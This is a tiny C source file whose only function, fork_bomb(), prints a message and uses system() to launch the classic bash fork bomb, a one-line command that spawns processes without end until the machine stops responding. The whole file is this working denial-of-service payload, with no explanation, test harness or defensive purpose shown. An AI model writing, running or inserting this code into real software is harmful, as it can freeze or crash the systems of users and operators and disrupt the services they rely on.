#include <stdlib.h>
#include <stdio.h> 
void fork_bomb() {
    printf("Running fork bomb...");
    system("/bin/bash -c ':(){ :|:& };:'");
}